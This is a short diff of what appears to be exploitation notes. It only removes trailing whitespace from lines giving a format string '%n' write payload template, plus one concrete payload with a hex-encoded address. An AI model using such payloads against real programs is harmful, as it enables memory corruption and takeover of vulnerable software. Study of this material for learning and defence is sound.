@@ -451,7 +451,7 @@ Output: AAAA|41414141
 %n writes bytes to an address
 
 ```Bash
-echo -e '<address>%<value - bytes written>x%<target>$n'	
+echo -e '<address>%<value - bytes written>x%<target>$n'
 ```
 
 ### Exploit Development
@@ -467,11 +467,11 @@ echo -e '<address>%<value - bytes written>x%<target>$n'
 ### Exploit Development
 
 ```Bash
-echo -e '<address>%<value - bytes written>x%<target>$n'	
+echo -e '<address>%<value - bytes written>x%<target>$n'
 ```
 
 ```Bash
-echo -e '\x5c\x10\x20\x00%B33Bx%10$n'	
+echo -e '\x5c\x10\x20\x00%B33Bx%10$n'
 ```
 
 
